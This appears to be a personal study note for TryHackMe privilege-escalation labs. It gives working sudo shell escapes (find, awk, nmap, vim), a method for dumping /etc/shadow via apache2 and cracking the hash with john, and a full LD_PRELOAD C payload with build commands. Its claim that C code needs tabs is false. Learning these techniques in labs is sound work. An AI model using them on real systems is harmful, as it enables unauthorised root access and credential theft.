#Linux #PrivEsc #sudo #GTFOBins #Find #AWK #nmap #vim #LD_PRELOAD  #gcc #C #john #Apache #hashcat #/etc/shadow #wget 


# **Sudo Shell Escaping**
#sudo #GTFOBins #Find #AWK #nmap #vim

[GTFOBins](https://gtfobins.github.io/)

[Linux PrivEsc Playground](https://tryhackme.com/room/privescplayground)

- Example if we can run `find` as `sudo`: `sudo find . -exec /bin/sh \; -quit`
- This gets us a root shell

## **Detection**﻿
Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via `sudo`.

## **Exploitation**
Linux VM

1. In command prompt type any of the following:
	a. `sudo find /bin -name nano -exec /bin/sh \;`
	b. `sudo awk 'BEGIN {system("/bin/sh")}'`
	c. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
	d. `sudo vim -c '!sh'`

---

# **Intended Functionality**
#sudo #john #Apache #hashcat #/etc/shadow #wget 

More [examples](https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/)

## **Detection**
Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via `sudo`.

## **Exploitation**
Linux VM

1. In command prompt type: `sudo apache2 -f /etc/shadow`
2. From the output, copy the root hash.

Attacker VM  

1. Open command prompt and type: `echo '[Pasted Root Hash]' > hash.txt`
2. In command prompt type: `john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
3. From the output, notice the cracked credentials.

---

# **LD_PRELOAD**
#LD_PRELOAD #sudo #gcc #C
## **Detection**
Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice that the `LD_PRELOAD` environment variable is intact.

## **Exploitation**

1. Open a text editor and type:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>


void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");

}
```

2. Save the file as `x.c`
3. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
	- *Note: must use tabs not spaces in C code*
4. In command prompt type: `sudo LD_PRELOAD=/tmp/x.so apache2`
5. In command prompt type: `id`

---

# Simple CTF - THM

[dirsearch](https://github.com/maurosoria/dirsearch)

[Exploit-DB for Simple CMS](https://www.exploit-db.com/exploits/46635)

